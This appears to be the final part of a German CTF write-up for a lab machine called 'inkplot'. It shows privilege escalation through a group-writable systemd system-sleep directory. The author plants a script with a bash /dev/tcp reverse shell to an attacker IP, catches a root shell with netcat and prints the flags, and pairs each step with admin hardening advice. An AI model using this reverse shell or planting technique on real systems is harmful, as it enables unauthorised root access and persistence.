             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─pauline@inkplot ~</span>
<span class="command">╰─$ id</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="command">u<span class="command">i</span>d=1<span class="command">0</span><span class="command">0</span><span class="command">0</span>(p<span class="command">a</span>ul<span class="command">i</span>ne) g<span class="command">i</span>d=1<span class="command">0</span><span class="command">0</span><span class="command">0</span>(p<span class="command">a</span>ul<span class="command">i</span>ne) gr<span class="command">o</span>up<span class="command">s</span>=1<span class="command">0</span><span class="command">0</span><span class="command">0</span>(p<span class="command">a</span>ul<span class="command">i</span>ne),1<span class="command">0</span><span class="command">0</span>(u<span class="command">s</span>er<span class="command">s</span>),<span class="command">1002(admin)</span></span> <span class="password"><-- Mitglied der 'admin' Gr<span class="command">u</span>ppe!</span></pre>
                </div>
            </div>

             <p class="analysis">
                **Analyse:** Da `pauline` Mitglied der Gruppe `admin` ist, suche ich nach Dateien oder Verzeichnissen im Dateisystem, deren Gruppe `admin` ist, da ich darauf möglicherweise spezielle Berechtigungen habe. Ich verwende den `find`-Befehl, um ab dem Root-Verzeichnis (`/`) nach Dateien oder Verzeichnissen zu suchen, deren Gruppe (`-group`) `admin` ist. Fehlermeldungen (z.B. wegen fehlender Berechtigungen in anderen Verzeichnissen) leite ich nach `/dev/null` um.
            </p>
            <p class="evaluation">
                **Bewertung:** Der `find`-Befehl findet das Verzeichnis `/usr/lib/systemd/system-sleep`, dessen Gruppe `admin` ist. Dies ist ein hochinteressantes Verzeichnis. Skripte, die in diesem Verzeichnis platziert sind, werden von `systemd` mit Root-Berechtigungen ausgeführt, wenn das System in den Schlafmodus geht oder daraus aufwacht. Wenn die Gruppe `admin` Schreibberechtigungen in diesem Verzeichnis hat, könnte ich dort ein bösartiges Skript ablegen, das dann als Root ausgeführt wird.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn ein Benutzer Mitglied einer administrativen Gruppe (wie `admin`) ist, suche sofort nach Dateien oder Verzeichnissen, deren Gruppe diese administrative Gruppe ist (`find / -group <gruppe> 2&gt;/dev/null`) und prüfe die dortigen Berechtigungen. Systemd-Verzeichnisse (`system-sleep`, `systemd/system`, etc.) sind oft interessante Ziele für PE.
                <br>**Empfehlung (Admin):** Weise administrative Gruppen (wie `admin`) nur kritischen Verzeichnissen zu und stelle sicher, dass die dortigen Berechtigungen korrekt gesetzt sind (normalerweise sollte nur Root oder die Gruppe Root Schreibzugriff haben). Überprüfe die Berechtigungen von Systemd-Verzeichnissen sorgfältig.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─pauline@inkplot ~</span>
<span class="command">╰─$ find / -group admin 2&gt;/dev/null</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">/u<span class="command">s</span>r/l<span class="command">i</span>b/<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span>d/<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span>-<span class="command">s</span>leep</span> <span class="password"><-- Gef<span class="command">u</span>ndene<span class="command">s</span> Verze<span class="command">i</span><span class="command">c</span>hni<span class="command">s</span>!</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich prüfe die Dateiberechtigungen des Verzeichnisses `/usr/lib/systemd/system-sleep` mit `ls -la`.
            </p>
             <p class="evaluation">
                **Bewertung:** Die Ausgabe zeigt `drwxrwx--- 2 root admin ...`. Das bedeutet, dass der Besitzer (`root`) Lese-, Schreib- und Ausführberechtigungen hat, die Gruppe (`admin`) Lese-, Schreib- und Ausführberechtigungen (`rwx`), und andere keine Berechtigungen (`---`). Da ich als Benutzer `pauline` Mitglied der Gruppe `admin` bin, habe ich **Schreibberechtigungen** in diesem Verzeichnis! Dies ist ein **kritischer Privilege Escalation-Vektor**. Ich kann ein Skript in dieses Verzeichnis kopieren, und es wird beim nächsten Suspend/Resume-Ereignis als Root ausgeführt.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn du ein Verzeichnis findest, das einer administrativen Gruppe gehört, zu der dein Benutzer gehört, prüfe sofort die Schreibberechtigungen für die Gruppe. Verzeichnisse unter `/usr/lib/systemd/` sind besonders sensibel. Nutze schreibbare Verzeichnisse, die von Systemdiensten mit Root-Rechten gelesen/ausgeführt werden, um bösartige Skripte zu platzieren.
                <br>**Empfehlung (Admin):** **Dringend:** Entferne die Schreibberechtigungen für die Gruppe (`admin`) in kritischen Systemd-Verzeichnissen wie `/usr/lib/systemd/system-sleep`. Normalerweise sollten hier nur Root Lese- und Schreibrechte haben (`chmod 755` oder `750`). Überprüfe die Berechtigungen aller Systemd-Verzeichnisse.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─pauline@inkplot ~</span>
<span class="command">╰─$ ls -la /usr/lib/systemd/system-sleep</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="command">t<span class="command">o</span>t<span class="command">a</span>l 16</span>
<span class="password">drwxrwx---  2 r<span class="command">o</span><span class="command">o</span>t <span class="command">a</span>d<span class="command">m</span><span class="command">i</span>n  4<span class="command">0</span>96 Aug  2  2<span class="command">0</span>23 .</span> <span class="password"><-- Gr<span class="command">u</span>ppe 'ad<span class="command">m</span>in' h<span class="command">a</span>t <span class="command">S</span><span class="command">c</span>hr<span class="command">i</span>b<span class="command">b</span>ere<span class="command">c</span>ht<span class="command">i</span>g<span class="command">u</span>ngen!</span>
<span class="command">drwxr-xr-x 14 r<span class="command">o</span><span class="command">o</span>t r<span class="command">o</span><span class="command">o</span>t  12288 Jul 28  2<span class="command">0</span>23 ..</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um eine Root-Shell zu erhalten, erstelle ich ein einfaches Bash-Skript namens `root.sh` in meinem `/tmp`-Verzeichnis. Das Skript enthält einen Bash-Reverse-Shell-Payload (`bash -i >& /dev/tcp/192.168.2.199/4444 0>&1`), der eine interaktive Bash-Shell zu meinem Angreifer-System (192.168.2.199) auf Port 4444 schickt. Ich mache das Skript ausführbar (`chmod +x`). Anschließend kopiere ich dieses Skript mit `cp /tmp/root.sh /usr/lib/systemd/system-sleep/` in das schreibbare Systemd-Verzeichnis.
            </p>
             <p class="evaluation">
                **Bewertung:** Durch das Kopieren des Skripts in dieses Verzeichnis wird es beim nächsten System-Suspend/Resume-Ereignis automatisch von `systemd` als Root ausgeführt. Der Reverse-Shell-Payload in meinem Skript stellt sicher, dass ich eine Root-Shell auf meinem Angreifer-System erhalte, sobald das System in den Schlafmodus geht (oder daraus aufwacht). Dies ist die Ausnutzung des `admin`-Gruppen-Schreibrechte-Vektors zur Erlangung einer Root-Shell.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutze Verzeichnisse, die von Systemdiensten mit erhöhten Rechten gelesen/ausgeführt werden und in denen deine Gruppe Schreibrechte hat, um bösartige Skripte zu platzieren. Systemd-Service-Dateien oder Suspend/Resume-Skripte sind oft gute Ziele.
                <br>**Empfehlung (Admin):** Überprüfe die Berechtigungen von Systemd-Verzeichnissen. Implementiere File Integrity Monitoring (FIM), um Änderungen in kritischen Systemverzeichnissen zu erkennen. Begrenze die Berechtigungen administrativer Gruppen streng.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─pauline@inkplot ~</span>
<span class="command">╰─$ ech<span class="command">o</span> '#!/bin/b<span class="command">a</span><span class="command">s</span>h' &gt; /t<span class="command">m</span>p/r<span class="command">o</span><span class="command">o</span>t.<span class="command">s</span>h &amp;&amp; ech<span class="command">o</span> 'b<span class="command">a</span><span class="command">s</span>h -<span class="command">i</span> &gt;&amp; /de<span class="command">v</span>/t<span class="command">c</span>p/192.168.2.199/4444 0&gt;&amp;1' &gt;&gt; /t<span class="command">m</span>p/r<span class="command">o</span><span class="command">o</span>t.<span class="command">s</span>h &amp;&amp; <span class="command">c</span>h<span class="command">m<span class="command">o</span>d +x /t<span class="command">m</span>p/r<span class="command">o</span><span class="command">o</span>t.<span class="command">s</span>h</span></pre>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─pauline@inkplot ~</span>
<span class="command">╰─$ <span class="command">c</span>p /t<span class="command">m</span>p/r<span class="command">o</span><span class="command">o</span>t.<span class="command">s</span>h /u<span class="command">s</span>r/l<span class="command">i</span>b/<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span>d/<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span>-<span class="command">s</span>leep/</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Auf meinem Angreifer-System richte ich einen Netcat-Listener ein, der auf eingehende Verbindungen auf Port 4444 wartet. Ich verwende den Befehl `nc -lvnp 4444`. Dieser Listener wird die Root-Shell vom Zielsystem empfangen, sobald das Skript in `/usr/lib/systemd/system-sleep/` ausgeführt wird (d.h., wenn das System in den Schlafmodus geht).
            </p>
             <p class="evaluation">
                **Bewertung:** Das Einrichten des Listeners ist ein Standard-Schritt, um eine Reverse Shell zu empfangen. Der Listener ist jetzt aktiv und wartet darauf, dass das Zielsystem das Skript ausführt und die Verbindung zu meiner Maschine aufbaut.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Richte deinen Listener ein, bevor du den Exploit auslöst, der eine Reverse Shell initiieren soll. Wähle einen Port, der wahrscheinlich nicht blockiert ist.
                <br>**Empfehlung (Admin):** Überwache ausgehende Verbindungen von internen Systemen. Unerwartete ausgehende Verbindungen, insbesondere zu Ports, die nicht für legitime Dienste verwendet werden, können ein starker Indikator für eine kompromittierte Maschine sein, die versucht, eine Reverse Shell zu etablieren.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 4444</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="password">listening <span class="command">o</span>n [<span class="command">a</span>ny] 4444 ...</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich warte darauf, dass das Zielsystem in den Schlafmodus geht oder aufwacht, um das Skript in `/usr/lib/systemd/system-sleep/` auszulösen. Während ich warte, zeigt die Konsole eine Broadcast-Nachricht an, die signalisiert, dass das System suspendiert wird. Dies ist das Ereignis, das mein Skript auslöst. Auf meinem Netcat-Listener sehe ich eine eingehende Verbindung vom Zielsystem auf Port 4444. Die folgenden typischen Fehlermeldungen bei einer Pseudo-Terminal-Shell erscheinen, und dann ändert sich der Prompt zu `root@inkplot:/#`.
            </p>
             <p class="evaluation">
                **Bewertung:** Fantastisch! Der Root-Zugriff war erfolgreich! Das Skript in `/usr/lib/systemd/system-sleep/` wurde wie erwartet mit Root-Berechtigungen ausgeführt, und die Reverse Shell wurde initiiert. Der Prompt `root@inkplot:/#` bestätigt, dass ich jetzt eine interaktive Shell mit den höchsten Berechtigungen auf dem Zielsystem habe. Das Ziel der Root Privilege Escalation ist erreicht.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Sei geduldig, wenn du auf zeitbasierte oder Event-basierte Trigger für deine Payloads wartest. Überprüfe die System-Logs oder beobachte Broadcast-Nachrichten, die solche Events signalisieren könnten. Nach Erhalt der Root-Shell sofort die Root-Flag sichern.
                <br>**Empfehlung (Admin):** Die Kompromittierung des Systems ist vollständig. Führe eine gründliche forensische Analyse durch, um den genauen Zeitpunkt und Vektor der Kompromittierung zu identifizieren. Beseitige das bösartige Skript in `/usr/lib/systemd/system-sleep/` und setze die Dateiberechtigungen korrekt. Überprüfe alle Systemd-Verzeichnisse und andere kritische Bereiche auf ungewollte Dateien oder Skripte. Setze das System neu auf einem sauberen Image auf und implementiere die empfohlenen Härtungsmaßnahmen.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─pauline@inkplot ~</span>
<span class="command">╰─$</span>
<span class="password">Broadcast message from root@inkplot (<span class="command">S<span class="command">a</span>t 2025-06-14 23:59:12 CE<span class="command">S</span>T</span>):</span>

<span class="password">The <span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span> w<span class="command">i</span>ll <span class="command">s</span>u<span class="command">s</span>pend n<span class="command">o</span>w!</span></pre>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 4444</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="password">listening <span class="command">o</span>n [<span class="command">a</span>ny] 4444 ...</span>
<span class="password"><span class="command">c</span><span class="command">o</span>nne<span class="command">c</span>t t<span class="command">o</span> [<span class="command">192.168.2.199</span>] fr<span class="command">o</span>m (UNK<span class="command">NO</span>WN) [<span class="command">192.168.2.43</span>] 54462</span>
b<span class="command">a</span><span class="command">s</span>h: <span class="command">c</span><span class="command">a</span>nn<span class="command">o</span>t <span class="command">s</span>et ter<span class="command">m</span><span class="command">i</span>n<span class="command">a</span>l pr<span class="command">o</span><span class="command">c</span>e<span class="command">ss</span> gr<span class="command">o</span>up (24173): In<span class="command">a</span>ppr<span class="command">o</span>pr<span class="command">i</span><span class="command">a</span>te <span class="command">i</span><span class="command">o</span><span class="command">c</span>tl f<span class="command">o</span>r de<span class="command">v</span>ice
b<span class="command">a</span><span class="command">s</span>h: n<span class="command">o</span> j<span class="command">o</span>b <span class="command">c</span><span class="command">o</span>ntr<span class="command">o</span>l <span class="command">i</span>n th<span class="command">i</span><span class="command">s</span> <span class="command">s</span>hell
<span class="password">r<span class="command">o</span><span class="command">o</span>t@<span class="command">i</span>nkpl<span class="command">o</span>t:/#</span> <span class="password"><-- R<span class="command">oo</span>t <span class="command">S</span>hell erf<span class="command">o</span>lgre<span class="command">i</span><span class="command">c</span>h!</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Mit der Root-Shell navigiere ich zum `/root`-Verzeichnis, da dort üblicherweise die Root-Flag gespeichert ist. Ich liste den Inhalt auf (`ls`) und finde die Datei `root.txt`. Anschließend zeige ich den Inhalt dieser Datei mit `cat root.txt` an, um die Root-Flag zu erhalten.
            </p>
            <p class="evaluation">
                **Bewertung:** Fantastisch! Der Inhalt von `root.txt` ist die Root-Flag: `<span class="password">4d9089c262be4a03e3ebfdaff0a8f7c6</span>`. Die erfolgreiche Erlangung der User-Flag und der Root-Flag bestätigt, dass ich das System vollständig kompromittiert und Root-Zugriff erlangt habe.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Sobald du Root-Zugriff hast, sichere sofort die Root-Flag. Das ist das ultimative Ziel der meisten Pentests und CTFs. Dokumentiere den Flag-Wert präzise.
                <br>**Empfehlung (Admin):** Speichere sensitive Dateien wie Root-Flags oder Produktionsdaten nicht in Standard-Home-Verzeichnissen oder `/root`. Implementiere strenge Zugriffskontrollen und überwache Zugriffe auf privilegierte Verzeichnisse. Das System ist kompromittiert und muss gründlich untersucht und neu aufgesetzt werden.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">r<span class="command">o</span><span class="command">o</span>t@<span class="command">i</span>nkpl<span class="command">o</span>t:/# <span class="command">c</span>d /r<span class="command">o</span><span class="command">o</span>t</span>
<span class="command">r<span class="command">o</span><span class="command">o</span>t@<span class="command">i</span>nkpl<span class="command">o</span>t:/r<span class="command">o</span><span class="command">o</span>t# l<span class="command">s</span></span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="command">r<span class="command">o</span><span class="command">o</span>t.txt</span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">r<span class="command">o</span><span class="command">o</span>t@<span class="command">i</span>nkpl<span class="command">o</span>t:/r<span class="command">o</span><span class="command">o</span>t# <span class="command">c</span><span class="command">a</span>t r<span class="command">o</span><span class="command">o</span>t.txt</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">4d9<span class="command">0</span>89<span class="command">c</span>262be4<span class="command">a</span><span class="command">0</span>3e3ebfd<span class="command">a</span>ff<span class="command">0</span><span class="command">a</span>8f7<span class="command">c</span>6</span> <span class="password"><-- Die R<span class="command">oo</span>t Fl<span class="command">a</span>g!</span></pre>
                </div>
            </div>
        </section>

        <section id="flags">
            <div class="flag-container">
                <h2 class="flag-heading">Flags</h2>
                <div class="flag-entry">
                    <div class="flag-command">cat /home/pauline/user.txt</div>
                    <div class="flag-value"><span class="password">a2c145eb8279c2f920de6871bef794fa</span></div>
                </div>
                <div class="flag-entry">
                    <div class="flag-command">cat /root/root.txt</div>
                    <div class="flag-value"><span class="password">4d9089c262be4a03e3ebfdaff0a8f7c6</span></div>
                </div>
            </div>
        </section>


    </div> <!-- Ende container -->

    <footer class="footer">
        <p>Ben - Cyber Security Reports</p>
        <p>Berichtsdatum: 14. Juni 2025</p> <!-- Datum aus Text extrahiert -->
    </footer>

   
</body>
</html>